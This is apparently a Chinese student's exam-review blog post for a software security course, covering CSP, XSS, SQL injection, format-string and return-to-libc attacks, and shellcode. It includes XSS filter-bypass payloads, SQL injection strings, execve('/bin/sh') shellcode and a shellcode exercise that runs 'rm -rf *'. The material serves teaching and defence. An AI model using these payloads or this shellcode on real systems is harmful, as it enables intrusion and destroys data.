<h4 id="CSP-Content-Security-Policy"><a href="#CSP-Content-Security-Policy" class="headerlink" title="CSP (Content Security Policy)"></a>CSP (<strong>Content Security Policy</strong>)</h4><p>为了防止攻击，页面中的代码必须明确规定是否可执行：</p>
<ul>
<li><strong>嵌入式代码</strong>用nonce来明确是否可执行；</li>
<li><strong>链接文件</strong>则使用<code>script-src 'self' example.com</code>来添加信任的网站来源，仅有来自信任范围内网站的文件才可以执行。</li>
</ul>
<p>通过上述方式，CSP 禁止执行<strong>内联脚本</strong>（Inline Scripts，如 <code>&lt;script&gt;...&lt;/script&gt;</code> 和 <code>onclick="..."</code>）以及未授权域名的外部脚本。这使得攻击者即使注入了 HTML 标签，其中的脚本也无法运行。</p>
<h3 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h3><p><strong>问题：</strong> 只要移除用户输入中的 <code>&lt;script&gt;</code> 标签就能防止 XSS 吗？</p>
<blockquote>
<p>不能。JavaScript 可以通过多种非 <code>&lt;script&gt;</code> 标签的方式执行：</p>
<ol>
<li><strong>事件处理器：</strong> <code>&lt;img src=x onerror=alert(1)&gt;, &lt;body onload=...&gt;, &lt;button onclick=...&gt;</code>。</li>
<li><strong>伪协议：</strong> <code>&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;</code>。</li>
<li><strong>其他标签：</strong> <code>&lt;iframe&gt;, &lt;object&gt;, &lt;svg&gt;</code> 等。</li>
<li><strong>混淆绕过：</strong> <code>&lt;scr&lt;script&gt;ipt&gt;</code>（如果过滤器只处理一次）。</li>
</ol>
</blockquote>
<p><strong>问题：</strong> 分析代码中执行情况。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">    $cspheader = "Content-Security-Policy:".</span></span><br><span class="line"><span class="meta">        "default-src ’self’;".</span></span><br><span class="line"><span class="meta">        "script-src ’self’ ’nonce-1rA2345’ ’example.com’".</span></span><br><span class="line"><span class="meta">        "";</span></span><br><span class="line"><span class="meta">    header($cspheader);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">nonce</span>=<span class="string">"1rA2345"</span>&gt;</span></span><br><span class="line">	... JavaScript Code ... ➊</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">nonce</span>=<span class="string">"2rB3333"</span>&gt;</span></span><br><span class="line">	... JavaScript Code ... ➋</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">	... JavaScript Code ... ➌</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"script.js"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> ➍</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://example.com/script2.js"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> ➎</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert(’hello’)"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span> ➏</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>➊可执行；➋不可执行；➌不可执行；➍可执行（策略包含 ‘self’，允许加载<strong>同源</strong>的外部脚本文件。）；➎可执行（策略包含 ‘example.com’ 作为允许的脚本来源）；➏这是一个<strong>内联事件处理器</strong> (Inline Event Handler)。CSP 将其视为内联脚本，默认禁止。</p>
</blockquote>
<h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><h3 id="知识内容-6"><a href="#知识内容-6" class="headerlink" title="知识内容"></a>知识内容</h3><p><img src="/2025/11/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8E%A8%E7%90%86/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80%E7%AE%97%E5%AD%90/eb_architecture_chinese.png"></p>
<h4 id="SQL-语句中的注释"><a href="#SQL-语句中的注释" class="headerlink" title="SQL 语句中的注释"></a>SQL 语句中的注释</h4><p>MySQL 支持三种注释方式：</p>
<ul>
<li>以 <code>#</code> 字符开始，直到行尾的文本均视为注释。</li>
<li>从 <code>–</code> 字符开始，直到行尾的文本均视为注释。注意：该方式要求第二个破折号后面跟随至少一个空格或控制符（如制表符 tab 等）。</li>
<li>与 C 语言类似，介于 <code>/*</code> 和 <code>*/</code> 之间的文本视为注释。与前面两种方式不同，该方式允许注释穿插在 SQL 语句中间，或跨越多行。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee;   # Comment <span class="keyword">to</span> the <span class="keyword">end</span> <span class="keyword">of</span> line</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee;   <span class="comment">-- Comment to the end of line</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="comment">/* In-line comment */</span> employee;</span><br></pre></td></tr></table></figure>

<h4 id="基本攻击方法"><a href="#基本攻击方法" class="headerlink" title="基本攻击方法"></a>基本攻击方法</h4><ul>
<li>（注释符攻击）获取选定的信息：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Name, Salary, SSN</span><br><span class="line"><span class="keyword">FROM</span> employee</span><br><span class="line"><span class="keyword">WHERE</span> eid<span class="operator">=</span> <span class="string">'EID5002'</span>  # <span class="keyword">and</span> password<span class="operator">=</span><span class="string">'xyz'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>（恒真式攻击）获取全部信息：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Name, Salary, SSN</span><br><span class="line"><span class="keyword">FROM</span> employee</span><br><span class="line"><span class="keyword">WHERE</span> eid<span class="operator">=</span> <span class="string">'a'</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>（如果题目说允许执行多条语句）使用分号<code>;</code>来开启新的恶意语句。</li>
</ul>
<blockquote>
<p>注：虽然 MySQL <strong>数据库本身</strong>支持堆叠查询，但大多数 PHP 的 MySQL 驱动（如 mysql_query 或默认配置下的 PDO、mysqli::query）为了安全，<strong>默认禁止</strong>在一个 API 调用中执行多条 SQL 语句（Stacked Queries）。</p>
</blockquote>
<h3 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h3><p><strong>问题</strong>：如何攻击：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> "SELECT * FROM employee</span><br><span class="line">WHERE eid=SHA2(’$eid’, 256) and password=SHA2(’$passwd’, 256)";</span><br></pre></td></tr></table></figure>

<blockquote>
<p>想法：加入<code>OR 1=1</code>。可以让<code>eid</code>为<code>xyz', 256) OR 1=1</code>。</p>
</blockquote>
<p><strong>问题</strong>：修改指定SQL语句为Prepared Statement语句。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SQL 模板中不包含变量，只包含占位符</span></span><br><span class="line">$sql = <span class="string">"UPDATE employee SET password=? WHERE eid=? and password=?"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($stmt = $conn-&gt;prepare($sql)) {</span><br><span class="line">    <span class="comment">// 绑定参数：s 代表 string 类型。顺序必须对应：newpwd, eid, oldpwd</span></span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"sss"</span>, $hashed_newpwd, $eid, $hashed_oldpwd);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></blockquote>
<h2 id="格式化字符串攻击"><a href="#格式化字符串攻击" class="headerlink" title="格式化字符串攻击"></a>格式化字符串攻击</h2><h3 id="知识内容-7"><a href="#知识内容-7" class="headerlink" title="知识内容"></a>知识内容</h3><ul>
<li><code>%n</code>：这个格式规定符会把目前已打印出的字符的个数写入内存。<code>printf()</code> 遇到 <code>%n</code> 时，<strong>它获取 <code>va_list</code> 指针指向的值，视该值为一个内存地址，然后将数据写入该地址。</strong>（写成多少，写谁。特别注意：写“谁”，这个“谁”的地址要在栈上，所有要将RA放置在badfile当中！）</li>
</ul>
<h3 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h3><p><strong>问题</strong>：如何利用格式化字符串实现Return-to-libc 攻击？</p>
<p><img src="/2025/11/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8E%A8%E7%90%86/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80%E7%AE%97%E5%AD%90/mage-20251224231256769.png"></p>
<blockquote>
<p>本质上只需要利用格式化字符串写入 3 个连续的栈位置（在原返回地址处）：</p>
<ol>
<li><strong>Region 1 (Ret Addr):</strong> 写入 <code>system()</code> 函数的地址。</li>
<li><strong>Region 1 + 4 (Ret Addr of system):</strong> 写入 <code>exit()</code> 的地址（或者任意垃圾地址，如果不在乎崩溃）。这是 system 函数执行完后的返回位置。</li>
<li><strong>Region 1 + 8 (Argument):</strong> 写入指向字符串 “/bin/sh” 的指针地址。这个字符串可以放在我们的 Buffer (Region 2) 中。</li>
</ol>
</blockquote>
<h2 id="Return-to-libc-攻击"><a href="#Return-to-libc-攻击" class="headerlink" title="Return-to-libc 攻击"></a>Return-to-libc 攻击</h2><h3 id="知识内容-8"><a href="#知识内容-8" class="headerlink" title="知识内容"></a>知识内容</h3><p>见文档。</p>
<h3 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h3><p>感觉弄清楚攻击过程即可。</p>
<blockquote>
<p>备注：在32位系统中，<strong>普通函数调用</strong>通过栈来传递参数（Return-to-libc 攻击），<strong>系统调用</strong>通过寄存器来传递参数（Shellcode）。而在64位系统中，普通函数调用的前 6 个参数也是用寄存器传递：依次放进 rdi, rsi, rdx, rcx, r8, r9。</p>
</blockquote>
<h2 id="Shellcode-编程"><a href="#Shellcode-编程" class="headerlink" title="Shellcode 编程"></a>Shellcode 编程</h2><h3 id="知识内容-9"><a href="#知识内容-9" class="headerlink" title="知识内容"></a>知识内容</h3><h4 id="栈技术实现"><a href="#栈技术实现" class="headerlink" title="栈技术实现"></a>栈技术实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; 将参数字符串保存到堆栈上</span><br><span class="line">      xor  eax, eax</span><br><span class="line">      push eax          ; 使用零终止该字符串</span><br><span class="line">      push "//sh"</span><br><span class="line">      push "/bin"</span><br><span class="line">      mov  ebx, esp     ; 获取字符串地址</span><br><span class="line"></span><br><span class="line">      ; 构建参数数组 argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] 指向 "/bin//sh"</span><br><span class="line">      mov  ecx, esp     ; 获取 argv[] 数组的地址</span><br><span class="line"></span><br><span class="line">      ; 环境变量 </span><br><span class="line">      xor  edx, edx     ; 不传递任何环境变量 </span><br><span class="line"></span><br><span class="line">      ; 调用 execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>

<h4 id="代码段方法"><a href="#代码段方法" class="headerlink" title="代码段方法"></a>代码段方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">        BITS 32</span><br><span class="line">        jmp short two</span><br><span class="line">    one:</span><br><span class="line">        pop ebx          </span><br><span class="line">        xor eax, eax</span><br><span class="line">        mov [ebx+7],  al  ; 将 0x00 (1 字节) 存入地址 ebx+7 中</span><br><span class="line">        mov [ebx+8],  ebx ; 将 ebx（4 个字节）存入地址 ebx+8 </span><br><span class="line">        mov [ebx+12], eax ; 将 eax（4 个字节）存入地址 ebx+12 </span><br><span class="line">        lea ecx, [ebx+8]  ; 让 ecx = ebx + 8</span><br><span class="line">        xor edx, edx</span><br><span class="line">        mov al,  0x0b</span><br><span class="line">        int 0x80</span><br><span class="line">     two:</span><br><span class="line">        call one</span><br><span class="line">        db '/bin/sh*'    </span><br><span class="line">        db 'AAAA'        </span><br><span class="line">        db 'BBBB'       </span><br></pre></td></tr></table></figure>

<h3 id="练习-9"><a href="#练习-9" class="headerlink" title="练习"></a>练习</h3><p><strong>问题：</strong> 在调用 <code>execve()</code> 系统调用之前，需要准备哪四个寄存器？它们应该包含什么值？</p>
<blockquote>
<p>在 32 位 Linux (x86) 系统中，使用 <code>int 0x80</code> 触发系统调用。<code>execve</code> 的系统调用号是 <strong>11 (0x0b)</strong>。</p>
<ul>
<li><strong>EAX:</strong> 存储系统调用号 <strong>11 (0x0b)</strong>。</li>
<li><strong>EBX:</strong> 存储 <strong>命令字符串的内存地址</strong> (指向要执行的程序路径，如 “/bin/sh”)。</li>
<li><strong>ECX:</strong> 存储 <strong>参数数组 (<code>argv[]</code>) 的内存地址</strong>。该数组是一系列指针，第一个指向命令字符串，最后一个必须是 NULL (0)。</li>
<li><strong>EDX:</strong> 存储 <strong>环境变量数组 (<code>envp[]</code>) 的内存地址</strong>。通常在 Shellcode 中设为 <strong>0 (NULL)</strong>。</li>
</ul>
</blockquote>
<p><strong>问题</strong>：补全代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">  _start:</span><br><span class="line">      BITS 32</span><br><span class="line">      jmp short two</span><br><span class="line">  one:</span><br><span class="line">      pop edx             ; 获取数据的基地址</span><br><span class="line">      xor eax, eax        ; 将 eax 清零</span><br><span class="line">      mov [*+?], al       ; 【填空1】用 0 截断字符串</span><br><span class="line">      lea ebx, [*+?]      ; 【填空2】获取字符串 "/bin/sh" 的地址存入 ebx</span><br><span class="line">      mov [*+?], eax      ; 【填空3】将 argv[1] 设置为 NULL (0)</span><br><span class="line">      mov [*+?], ebx      ; 【填空4】将字符串地址存入 argv[0]</span><br><span class="line">      mov ecx, *          ; 【填空5】将 argv 数组的地址存入 ecx</span><br><span class="line">      xor *, *            ; 【填空6】将 edx 清零 (作为 envp 参数)</span><br><span class="line">      mov al, 0x0b        ; 系统调用号 execve</span><br><span class="line">      int 0x80            ; 执行系统调用</span><br><span class="line">  two:</span><br><span class="line">      call one</span><br><span class="line">      db 'AAAA'           ; Offset 0: 预留给 argv[0] 指针</span><br><span class="line">      db 'BBBB'           ; Offset 4: 预留给 argv[1] NULL</span><br><span class="line">      db '/bin/sh*'       ; Offset 8: 字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>补全后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">  _start:</span><br><span class="line">      BITS 32</span><br><span class="line">      jmp short two</span><br><span class="line">  one:</span><br><span class="line">      pop edx             ; edx 现在指向 'AAAA' 的首地址 (Base Address)</span><br><span class="line">      </span><br><span class="line">      xor eax, eax        ; eax = 0 (用于制造 NULL)</span><br><span class="line"></span><br><span class="line">      ; [填空1] 字符串截断</span><br><span class="line">      ; 字符串 '/bin/sh*' 从 edx+8 开始。</span><br><span class="line">      ; '/bin/sh' 长度为 7。 '*' 在第 8 个位置。</span><br><span class="line">      ; 所以 offset = 8 + 7 = 15。</span><br><span class="line">      mov [edx+15], al    </span><br><span class="line">      </span><br><span class="line">      ; [填空2] 获取文件名地址 (execve 第1个参数: filename)</span><br><span class="line">      ; 字符串起始位置是 edx+8</span><br><span class="line">      lea ebx, [edx+8]   ; 计算出 edx + 8 的结果，然后把这个结果（一个内存地址）存入 ebx。注意和 mov ebx, [edx+8] 不同！</span><br><span class="line">      </span><br><span class="line">      ; [填空3] 构造 argv[1] = NULL</span><br><span class="line">      ; argv[1] 的位置是 'BBBB'，偏移量为 4</span><br><span class="line">      mov [edx+4], eax    </span><br><span class="line">      </span><br><span class="line">      ; [填空4] 构造 argv[0] = filename_ptr</span><br><span class="line">      ; argv[0] 的位置是 'AAAA'，偏移量为 0</span><br><span class="line">      ; 我们把 ebx (字符串地址) 填进去</span><br><span class="line">      mov [edx+0], ebx    </span><br><span class="line">      </span><br><span class="line">      ; [填空5] 获取参数数组地址 (execve 第2个参数: argv)</span><br><span class="line">      ; argv 数组就是从 edx (偏移量0) 开始的</span><br><span class="line">      mov ecx, edx        </span><br><span class="line">      </span><br><span class="line">      ; [填空6] 清空环境变量参数 (execve 第3个参数: envp)</span><br><span class="line">      ; edx 之前用作基地址指针，现在用完了，必须清零传给 syscall</span><br><span class="line">      xor edx, edx        </span><br><span class="line">      </span><br><span class="line">      mov al, 0x0b</span><br><span class="line">      int 0x80</span><br><span class="line">  two:</span><br><span class="line">      call one</span><br><span class="line">      db 'AAAA'           ; Offset +0</span><br><span class="line">      db 'BBBB'           ; Offset +4</span><br><span class="line">      db '/bin/sh*'       ; Offset +8</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>问题：</strong> 补全代码，利用给定的数据块实现 <code>execve("/bin/rm", ["/bin/rm", "-rf", "*", NULL], NULL)</code>。</p>
<blockquote>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    jmp short two</span><br><span class="line">one:</span><br><span class="line">    pop ebx             ; ebx 指向数据块起始 ('abcd...')</span><br><span class="line"></span><br><span class="line">    xor eax, eax        ; eax = 0</span><br><span class="line"></span><br><span class="line">    ; 1. 字符串 Null 截断</span><br><span class="line">    mov [ebx+11], al    ; 结束 "/bin/rm"</span><br><span class="line">    mov [ebx+16], al    ; 结束 "-rf"</span><br><span class="line">    mov [ebx+18], al    ; 结束 "*"</span><br><span class="line"></span><br><span class="line">    ; 2. 构造 argv 数组 (使用 lea 计算地址，mov 存入数组)</span><br><span class="line">    lea edx, [ebx+4]    ; edx = address of "/bin/rm"</span><br><span class="line">    mov [ebx+20], edx   ; argv[0] = ptr to "/bin/rm"</span><br><span class="line"></span><br><span class="line">    lea edx, [ebx+13]   ; edx = address of "-rf"</span><br><span class="line">    mov [ebx+24], edx   ; argv[1] = ptr to "-rf"</span><br><span class="line"></span><br><span class="line">    lea edx, [ebx+17]   ; edx = address of "*"</span><br><span class="line">    mov [ebx+28], edx   ; argv[2] = ptr to "*"</span><br><span class="line"></span><br><span class="line">    mov [ebx+32], eax   ; argv[3] = NULL (DDDD处)</span><br><span class="line"></span><br><span class="line">    ; 3. 准备 execve 参数</span><br><span class="line">    lea ecx, [ebx+20]   ; ecx = address of argv array</span><br><span class="line">    lea ebx, [ebx+4]    ; ebx = address of filename ("/bin/rm")</span><br><span class="line">    </span><br><span class="line">    mov al, 0x0b        ; 系统调用号 11</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">two:</span><br><span class="line">    call one</span><br><span class="line">    db 'abcd/bin/rmab-rf****'</span><br><span class="line">    db 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>问题</strong>：在大端机器、小端机器的情形下，在栈上存储 “ab” 且不能使用字节零。</p>
<blockquote>
<p>（1）小端机器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, "ab**"  ; ecx = 0x2A2A6261</span><br><span class="line">shl ecx, 16      ; ecx = 0x62610000 (Clears top chars, creates zeros at bottom)</span><br><span class="line">shr ecx, 16      ; ecx = 0x00006261 (Moves back, zeros at top)</span><br><span class="line">push ecx         ; Stack: 61 62 00 00 ("ab\0\0")</span><br></pre></td></tr></table></figure>

<p>（2）大端机器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, "ab**"</span><br><span class="line">shr ecx, 16</span><br><span class="line">shl ecx, 16</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>问题：</strong> 将 <code>0xAA00BB00</code> 存入 eax，机器码不能含字节 0。</p>
<blockquote>
<p>想法是分开2部分构造，然后合并。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax        ; eax = 0 (机器码: 31 C0)</span><br><span class="line">mov al, 0xAA        ; eax = 0x000000AA (机器码: B0 AA)</span><br><span class="line">shl eax, 24         ; eax = 0xAA000000 (左移24位，机器码: C1 E0 18 - 无零)</span><br><span class="line"></span><br><span class="line">xor ebx, ebx        ; ebx = 0</span><br><span class="line">mov bl, 0xBB        ; ebx = 0x000000BB</span><br><span class="line">shl ebx, 8          ; ebx = 0x0000BB00 (左移8位)</span><br><span class="line"></span><br><span class="line">or eax, ebx         ; eax = 0xAA00BB00 (合并)</span><br></pre></td></tr></table></figure></blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://stellarhui.github.io">摘星的辉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/">https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://stellarhui.github.io" target="_blank">皓月星辰</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/favicon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CLec6%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/" title="计算机网络（6）：应用层"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">计算机网络（6）：应用层</div></div><div class="info-2"><div class="info-item-1">网络应用模型主机之间如何进行交互？可以分为2种组织架构：  C/S模型（客户端/服务器模型） P2P模型  域名系统Domain Name System (DNS)系统将网站名称（实际是主机名）映射至IP地址。  </div></div></div></a><a class="pagination-related" href="/2025/12/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CLec5%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/" title="计算机网络（5）：传输层"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">计算机网络（5）：传输层</div></div><div class="info-2"><div class="info-item-1">传输层简介传输层的位置和功能传输层位于网络层和应用层之间。如下图。   这里的Transport service interface指的是：operations provided by transport layer to application programs。这些operations具体就是一些原语，例如：  从而，（从使用的原语角度看，）两个进程之间的通信过程可以表示为：   